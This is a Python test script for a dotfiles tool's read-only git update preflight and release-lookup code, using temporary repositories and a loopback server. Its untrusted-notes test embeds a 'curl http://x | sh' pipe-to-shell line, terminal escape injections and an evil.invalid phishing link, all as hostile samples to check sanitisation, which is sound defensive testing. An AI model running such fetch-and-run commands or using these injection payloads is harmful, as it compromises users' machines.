#!/usr/bin/env python3
"""Checks for update_core: the read-only update preflight (disposable git repositories, a temp HOME) and the release lookup.

Nothing real is read: no network, no real checkout, no real settings."""
import hashlib
import json
import os
import shutil
import subprocess
import sys
import tempfile
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "config" / "hypr" / "scripts"))
import recovery_core as rc  # noqa: E402
import update_core as uc  # noqa: E402

AT = chr(64)   # written this way so that no sample address looks like a real email to the privacy hook
GITENV = dict(os.environ, GIT_AUTHOR_NAME="t", GIT_AUTHOR_EMAIL="t" + AT + "example.invalid", GIT_COMMITTER_NAME="t", GIT_COMMITTER_EMAIL="t" + AT + "example.invalid",
              GIT_CONFIG_GLOBAL="/dev/null", GIT_CONFIG_SYSTEM="/dev/null")


def git(cwd, *args):
    r = subprocess.run(["git", "-C", str(cwd), *args], env=GITENV, capture_output=True, text=True)
    return r.returncode, r.stdout.strip()


def fixture():
    """(clone, remote, other): a remote, a clone tracking it and a second clone to push from. All temporary."""
    root = Path(tempfile.mkdtemp(prefix="primo-update-"))
    remote = root / "remote.git"
    subprocess.run(["git", "init", "-q", "--bare", "-b", "main", str(remote)], env=GITENV, check=True)
    clone = root / "clone"
    subprocess.run(["git", "clone", "-q", str(remote), str(clone)], env=GITENV, check=True, capture_output=True)
    (clone / "a.txt").write_text("one\n")
    git(clone, "add", "a.txt")
    git(clone, "commit", "-q", "-m", "first")
    git(clone, "push", "-q", "-u", "origin", "main")
    other = root / "other"
    subprocess.run(["git", "clone", "-q", str(remote), str(other)], env=GITENV, check=True, capture_output=True)
    return clone, remote, other


def home_with_snapshot(fresh=True):
    home = Path(tempfile.mkdtemp(prefix="primo-update-home-"))
    for d in (".config/primo", ".local/share/primo", ".local/state/hyprland-dotfiles"):
        (home / d).mkdir(parents=True)
    (home / ".local/share/primo/hub.json").write_text("{}")
    env = {"HOME": str(home)}
    if fresh is not None:
        m = rc.create_snapshot(rc.plan_snapshot(env=env, home=home), env=env, home=home)
        if not fresh:
            mp = home / ".local/share/primo/snapshots" / m.id / "manifest.json"
            d = json.loads(mp.read_text())
            d["created"] = time.strftime("%Y-%m-%dT%H:%M:%S", time.localtime(time.time() - 30 * 86400))
            mp.write_text(json.dumps(d))
    return home, env


def level(report, cid):
    return next(c.level for c in report.checks if c.id == cid)


def detail(report, cid):
    return next(c.detail for c in report.checks if c.id == cid)


def everything(repo):
    """Every file in the checkout, .git included, with content hash and mtime: a preflight must leave all of it exactly as it was."""
    out = {}
    for p in sorted(Path(repo).rglob("*")):
        if p.is_file() and not p.is_symlink():
            out[str(p)] = (hashlib.sha256(p.read_bytes()).hexdigest(), p.stat().st_mtime_ns)
    return out


# ---- a clean checkout that tracks its remote is ready
clone, remote, other = fixture()
home, env = home_with_snapshot()
before = everything(clone)
r = uc.preflight(clone, env, home)
assert r.verdict == "ready" and r.exit_code() == 0, [(c.id, c.level, c.detail) for c in r.checks]
assert r.branch == "main" and r.ahead == 0 and r.behind == 0 and len(r.revision) >= 7
assert everything(clone) == before, "a preflight changes nothing in the checkout: files, refs, index, mtimes"

# the git commands it ran: reads only, never fetch, pull, reset, stash, checkout, switch, merge, add, commit, gc
shim = Path(tempfile.mkdtemp(prefix="primo-update-shim-"))
log = shim / "git.log"
real_git = shutil.which("git")
(shim / "git").write_text(f'#!/usr/bin/env bash\necho "$@" >> "{log}"\nexec {real_git} "$@"\n')
(shim / "git").chmod(0o755)
old_path = os.environ["PATH"]
os.environ["PATH"] = f"{shim}:{old_path}"
try:
    uc.preflight(clone, env, home)
finally:
    os.environ["PATH"] = old_path
subs = {line.split()[2] for line in log.read_text().splitlines()}
assert subs and subs <= {"rev-parse", "status", "rev-list", "remote"}, subs

# ---- local changes: counted and named, content never shown
(clone / "a.txt").write_text("changed secret-text\n")
(clone / "new.txt").write_text("x")
r = uc.preflight(clone, env, home)
assert r.verdict == "ready-with-warnings" and level(r, "worktree") == "warn"
d = detail(r, "worktree")
assert "1 changed" in d and "1 untracked" in d and "a.txt" in d and "new.txt" in d and "secret-text" not in d, d
big = Path(clone)
for i in range(20):
    (big / f"u{i}.txt").write_text("x")
assert detail(uc.preflight(clone, env, home), "worktree").endswith("...") and detail(uc.preflight(clone, env, home), "worktree").count(".txt") <= uc.MAX_PATHS
git(clone, "checkout", "-q", "--", "a.txt")
for p in clone.glob("*.txt"):
    if p.name != "a.txt":
        p.unlink()

# ---- ahead, behind (after the fixture itself fetched), diverged, no upstream
(clone / "b.txt").write_text("b")
git(clone, "add", "b.txt")
git(clone, "commit", "-q", "-m", "local")
r = uc.preflight(clone, env, home)
assert (r.ahead, r.behind) == (1, 0) and level(r, "upstream") == "ok"
(other / "c.txt").write_text("c")
git(other, "add", "c.txt")
git(other, "commit", "-q", "-m", "remote")
git(other, "push", "-q", "origin", "main")
r = uc.preflight(clone, env, home)
assert r.behind == 0, "preflight does not fetch: a remote commit it has not seen does not exist for it"
refs_before = everything(clone)
git(clone, "fetch", "-q")                                                         # the test fetches, the preflight never does
r = uc.preflight(clone, env, home)
assert (r.ahead, r.behind) == (1, 1) and level(r, "upstream") == "warn" and "diverged" in detail(r, "upstream")
git(clone, "reset", "-q", "--hard", "origin/main")
r = uc.preflight(clone, env, home)
assert (r.ahead, r.behind) == (0, 0)
git(clone, "branch", "-q", "--unset-upstream")
assert level(uc.preflight(clone, env, home), "upstream") == "warn"

# ---- detached HEAD, merge in progress, conflicts, not a checkout
git(clone, "checkout", "-q", "--detach")
r = uc.preflight(clone, env, home)
assert r.verdict == "blocked" and r.exit_code() == 2 and level(r, "checkout") == "block" and "detached" in detail(r, "checkout")
git(clone, "checkout", "-q", "main")
(clone / ".git" / "MERGE_HEAD").write_text("0" * 40 + "\n")
assert level(uc.preflight(clone, env, home), "checkout") == "block"
(clone / ".git" / "MERGE_HEAD").unlink()
git(clone, "checkout", "-q", "-b", "side")
(clone / "a.txt").write_text("side\n")
git(clone, "commit", "-q", "-am", "side")
git(clone, "checkout", "-q", "main")
(clone / "a.txt").write_text("main\n")
git(clone, "commit", "-q", "-am", "main change")
git(clone, "merge", "side")                                                       # a real conflict
r = uc.preflight(clone, env, home)
assert r.verdict == "blocked" and level(r, "checkout") == "block", [(c.id, c.level, c.detail) for c in r.checks]
assert uc.preflight(Path(tempfile.mkdtemp(prefix="primo-update-")), env, home).verdict == "blocked"
os.environ["PRIMO_REPO"] = tempfile.mkdtemp(prefix="primo-update-")                  # the default checkout is not a git checkout (an installed copy)
r = uc.preflight(None, env, home)
del os.environ["PRIMO_REPO"]
assert r.verdict == "blocked" and "git checkout" in detail(r, "checkout")

# ---- tools: a missing required tool blocks, and says which
clone, remote, other = fixture()
real_which = shutil.which
shutil.which = lambda name, *a, **k: None if name == "git" else real_which(name, *a, **k)
try:
    r = uc.preflight(clone, env, home)
finally:
    shutil.which = real_which
assert level(r, "tools") == "block" and "git" in detail(r, "tools") and r.verdict == "blocked"

# ---- settings files: newer is an incompatibility, broken a warning, missing fine
r = uc.preflight(clone, env, home)
assert level(r, "config") == "ok" and r.verdict == "ready"
(home / ".config/primo/modes.json").write_text('[\n {"id": }\n]')
r = uc.preflight(clone, env, home)
assert level(r, "config") == "warn" and "modes.json:2" in detail(r, "config") and r.verdict == "ready-with-warnings"
assert '"id"' not in detail(r, "config"), "file content is never quoted"
(home / ".config/primo/ui.json").write_text('{"version": 99}')
r = uc.preflight(clone, env, home)
assert level(r, "config-version") == "block" and "ui.json" in detail(r, "config-version") and r.verdict == "blocked"
(home / ".config/primo/ui.json").unlink()
(home / ".config/primo/modes.json").write_text("[]")
(home / ".config/primo/mine.json").write_text("[1, 2]")                          # another settings file may be a list
assert level(uc.preflight(clone, env, home), "config") == "ok"

# ---- the snapshot: none, old, fresh, only incomplete ones
h2, e2 = home_with_snapshot(fresh=None)
assert level(uc.preflight(clone, e2, h2), "snapshot") == "warn" and "primo snapshot" in next(c.hint for c in uc.preflight(clone, e2, h2).checks if c.id == "snapshot")
h2, e2 = home_with_snapshot(fresh=False)
assert level(uc.preflight(clone, e2, h2), "snapshot") == "warn" and "30 days" in detail(uc.preflight(clone, e2, h2), "snapshot")
h2, e2 = home_with_snapshot(fresh=True)
d = detail(uc.preflight(clone, e2, h2), "snapshot")
assert level(uc.preflight(clone, e2, h2), "snapshot") == "ok" and "not the repository or packages" in d, "the snapshot is never promised to roll back the repository"
sid = rc.list_snapshots(e2, h2)[0].id
mp = h2 / ".local/share/primo/snapshots" / sid / "manifest.json"
dd = json.loads(mp.read_text()); dd["complete"] = False; mp.write_text(json.dumps(dd))
assert level(uc.preflight(clone, e2, h2), "snapshot") == "warn", "an incomplete snapshot does not count"

# ---- credentials in a remote never reach the report
for url, bad in (("https://user:ghp_SECRET123" + AT + "github.com/sya17/primo.git", "SECRET123"),
                 ("https://token" + AT + "example.com/x/y.git?access_token=SECRET456", "SECRET456"), ("git" + AT + "github.com:sya17/primo.git", "")):
    out = uc.strip_credentials(url)
    assert (not bad or bad not in out) and ("github.com" in out or "example.com" in out), out
git(clone, "remote", "set-url", "origin", "https://user:ghp_SECRET789" + AT + "example.com/x/y.git")
r = uc.preflight(clone, env, home)
assert "SECRET789" not in repr(r) and "example.com/x/y.git" in detail(r, "remote")

# ---- the CLI: verdict, exit codes, JSON, usage
PRIMO = str(Path(__file__).resolve().parent / "primo")
def cli(repo, *a):
    r = subprocess.run([sys.executable, PRIMO, "update", *a], env=dict(os.environ, PRIMO_REPO=str(repo), HOME=str(home), XDG_CONFIG_HOME="", XDG_DATA_HOME="",
                                                                          XDG_STATE_HOME="", NO_COLOR="1"), capture_output=True, text=True, timeout=60)
    return r.returncode, r.stdout, r.stderr
clone, remote, other = fixture()
home, env = home_with_snapshot()
code, out, _e = cli(clone, "check", "--json")
doc = json.loads(out)
assert code == 0 and doc["verdict"] == "ready" and doc["branch"] == "main" and {c["id"] for c in doc["checks"]} >= {"tools", "checkout", "worktree", "upstream", "config", "snapshot"}
code, out, _e = cli(clone, "check")
assert code == 0 and "READY" in out and "Primo does not update itself" in out and "read-only" in out
(clone / "x").write_text("1")
assert cli(clone, "check")[0] == 1
git(clone, "checkout", "-q", "--detach")
code, out, _e = cli(clone, "check")
assert code == 2 and "BLOCKED" in out and "try: git switch main" in out
assert cli(clone)[0] == 64 and cli(clone, "apply")[0] == 64

# ---- T066: the release lookup (fake answers first, then a real loopback server for the urllib path; never the internet)
import threading  # noqa: E402
import urllib.error  # noqa: E402
from http.server import BaseHTTPRequestHandler, HTTPServer  # noqa: E402

REL = {"tag_name": "v0.8.0", "name": "Release 0.8.0", "published_at": "2026-10-20T10:00:00Z", "body": "## Features\n* nice thing\n",
       "html_url": uc.RELEASE_PAGE + "tag/v0.8.0"}
def reply(doc=REL, code=200, headers=None):
    body = doc if isinstance(doc, bytes) else json.dumps(doc).encode()
    return lambda url, timeout: (code, headers or {}, body)
home, env = home_with_snapshot(fresh=None)
cur = "0.7.0"
r = uc.check_release(cur, fetch=reply(), env=env, home=home)
assert (r.status, r.latest, r.published, r.url, r.breaking) == ("newer", "0.8.0", "2026-10-20T10:00:00Z", uc.RELEASE_PAGE + "tag/v0.8.0", False), r
assert uc.check_release("0.8.0", fetch=reply(), env=env, home=home).status == "current"
assert uc.check_release("0.9.1", fetch=reply(), env=env, home=home).status == "ahead"
r = uc.check_release("", fetch=reply(), env=env, home=home)
assert r.status == "unknown" and "installed version" in r.detail
assert uc.parse_version("v1.2.3") == (1, 2, 3) and uc.parse_version("1.2") is None and uc.parse_version("latest") is None and uc.parse_version("1.2.3-rc1") is None

# every way the answer can be wrong is named, and none of them is "up to date"
cases = [("malformed", reply({"tag_name": "latest"})), ("malformed", reply({"name": "x"})), ("malformed", reply(b"not json")), ("malformed", reply([1, 2])),
         ("malformed", reply({**REL, "published_at": "yesterday"})), ("too-large", reply(b"x" * (uc.REMOTE_CAP + 1))),
         ("redirected", reply(b"", 302, {"Location": "http://evil.invalid/x"})), ("rate-limited", reply({"message": "limit"}, 403, {"X-RateLimit-Remaining": "0"})),
         ("rate-limited", reply({}, 429)), ("unknown", reply({}, 500)), ("unknown", reply({}, 403)),
         ("offline", lambda u, t: (_ for _ in ()).throw(urllib.error.URLError("no route"))), ("offline", lambda u, t: (_ for _ in ()).throw(TimeoutError("slow")))]
for want, fetch in cases:
    got = uc.check_release(cur, fetch=fetch, env=env, home=home)
    assert got.status == want and got.latest == "" and got.status not in ("current", "newer"), (want, got)

# the notes are untrusted: control characters and escape sequences are gone, length is capped, nothing runs, a foreign link is dropped
evil = {**REL, "body": "\x1b]0;title\x07\x1b[31mred\x1b[0m\nrun this: curl http://x | sh\r\nBREAKING CHANGE: the config moved\n" + "A" * 5000,
        "name": "N\x1b[2Jame" * 50, "html_url": "https://evil.invalid/phish"}
r = uc.check_release(cur, fetch=reply(evil), env=env, home=home)
assert "\x1b" not in r.notes and "\x07" not in r.notes and "\r" not in r.notes and "curl http://x | sh" in r.notes, "shown as text, never run"
assert len(r.notes) <= uc.NOTES_CAP + 20 and r.notes.endswith("[shortened]") and len(r.name) <= 140 and "\x1b" not in r.name
assert r.breaking and r.url == "", (r.breaking, r.url)
assert uc.printable("a\x00b\x7fc\td", 50) == "a?b?c?d"
assert uc.releases_url("") == uc.RELEASES_URL and uc.releases_url("https://evil.invalid/x") == uc.RELEASES_URL and uc.releases_url("http://127.0.0.1:9/x") == "http://127.0.0.1:9/x"
assert uc.releases_url("http://127.0.0.1.evil.invalid/") == uc.RELEASES_URL and uc.releases_url("http://localhost.evil.invalid/") == uc.RELEASES_URL

# the cache: written privately after a good answer; after a failure it is a hint with its age, never a verdict
cache = home / ".local/state/hyprland-dotfiles/update-check.json"
assert cache.exists() and oct(cache.stat().st_mode & 0o777) == "0o600"
past = json.loads(cache.read_text()); past["checked_at"] = time.time() - 9 * 86400; cache.write_text(json.dumps(past))
r = uc.check_release(cur, fetch=lambda u, t: (_ for _ in ()).throw(urllib.error.URLError("down")), env=env, home=home)
assert r.status == "offline" and r.last_known.startswith("0.8.0 (looked up 9 day(s) ago)") and r.status != "current"
h3, e3 = home_with_snapshot(fresh=None)
assert uc.check_release(cur, fetch=lambda u, t: (_ for _ in ()).throw(OSError("down")), env=e3, home=h3).last_known == "", "no cache, no hint"
cache.write_text("{broken")
assert uc.check_release(cur, fetch=lambda u, t: (_ for _ in ()).throw(OSError("down")), env=env, home=home).last_known == ""


# the real urllib path against a loopback server
seen = []
class QuietServer(HTTPServer):
    def handle_error(self, *a):          # a client that gives up (the timeout and size cases) is expected here
        pass


class H(BaseHTTPRequestHandler):
    mode = "ok"
    def log_message(self, *a):
        pass
    def do_GET(self):
        seen.append((self.path, dict(self.headers)))
        mode = H.mode
        if mode == "redirect":
            self.send_response(302); self.send_header("Location", "/elsewhere"); self.end_headers(); return
        if mode == "limit":
            self.send_response(403); self.send_header("X-RateLimit-Remaining", "0"); self.end_headers(); self.wfile.write(b"{}"); return
        if mode == "slow":
            time.sleep(2)
        body = json.dumps(REL).encode() if mode != "big" else b"x" * (uc.REMOTE_CAP * 2)
        self.send_response(200); self.send_header("Content-Length", str(len(body))); self.end_headers(); self.wfile.write(body)
srv = QuietServer(("127.0.0.1", 0), H)
threading.Thread(target=srv.serve_forever, daemon=True).start()
base = f"http://127.0.0.1:{srv.server_address[1]}/releases/latest"
h4, e4 = home_with_snapshot(fresh=None)
H.mode = "ok"
r = uc.check_release(cur, url=base, env=e4, home=h4)
assert r.status == "newer" and r.latest == "0.8.0", r
sent = seen[-1][1]
assert sent.get("User-Agent") == "primo-update-check" and not any(k.lower() in ("authorization", "cookie") for k in sent), "nothing but a User-Agent and Accept goes out"
H.mode = "redirect"; seen.clear()
assert uc.check_release(cur, url=base, env=e4, home=h4).status == "redirected" and len(seen) == 1, "a redirect is not followed"
H.mode = "limit"
assert uc.check_release(cur, url=base, env=e4, home=h4).status == "rate-limited"
H.mode = "big"
assert uc.check_release(cur, url=base, env=e4, home=h4).status == "too-large"
H.mode = "slow"
old_timeout, uc.REMOTE_TIMEOUT = uc.REMOTE_TIMEOUT, 0.3
try:
    t0 = time.time()
    assert uc.check_release(cur, url=base, env=e4, home=h4).status == "offline" and time.time() - t0 < 1.5, "a slow server is given up on"
finally:
    uc.REMOTE_TIMEOUT = old_timeout
srv.shutdown()
dead = uc.check_release(cur, url=base, env=e4, home=h4)                       # nothing listens any more
assert dead.status == "offline"

# the CLI: --remote is the only way to reach out; without it nothing is asked
srv = QuietServer(("127.0.0.1", 0), H)
threading.Thread(target=srv.serve_forever, daemon=True).start()
base = f"http://127.0.0.1:{srv.server_address[1]}/releases/latest"
H.mode = "ok"; seen.clear()
clone, remote, other = fixture()
home, env = home_with_snapshot()
def cli_env(**extra):
    return dict(os.environ, PRIMO_REPO=str(clone), HOME=str(home), XDG_CONFIG_HOME="", XDG_DATA_HOME="", XDG_STATE_HOME="", NO_COLOR="1", **extra)
(clone / "CHANGELOG.md").write_text("# Changelog\n\n## [0.7.0] - 2026-10-12\n")
r = subprocess.run([sys.executable, PRIMO, "update", "check"], env=cli_env(PRIMO_RELEASES_URL=base), capture_output=True, text=True, timeout=60)
assert r.returncode in (0, 1) and not seen and "Latest release" not in r.stdout, "no --remote, no request"
r = subprocess.run([sys.executable, PRIMO, "update", "check", "--remote"], env=cli_env(PRIMO_RELEASES_URL=base), capture_output=True, text=True, timeout=60)
assert len(seen) == 1 and "0.8.0 is available (you have 0.7.0)" in r.stdout and "plain text" in r.stdout and "| ## Features" in r.stdout, r.stdout
r = subprocess.run([sys.executable, PRIMO, "update", "check", "--remote", "--json"], env=cli_env(PRIMO_RELEASES_URL=base), capture_output=True, text=True, timeout=60)
doc = json.loads(r.stdout)
assert doc["remote"]["status"] == "newer" and doc["remote"]["latest"] == "0.8.0" and doc["verdict"] in ("ready", "ready-with-warnings")
srv.shutdown()
r = subprocess.run([sys.executable, PRIMO, "update", "check", "--remote"], env=cli_env(PRIMO_RELEASES_URL=base), capture_output=True, text=True, timeout=60)
assert r.returncode in (0, 1) and "offline" in r.stdout and "last known answer: 0.8.0" in r.stdout and "a hint, not a check" in r.stdout, r.stdout
assert "READY" in r.stdout, "an unreachable release page never turns the local verdict into a failure"

print("ok: update")
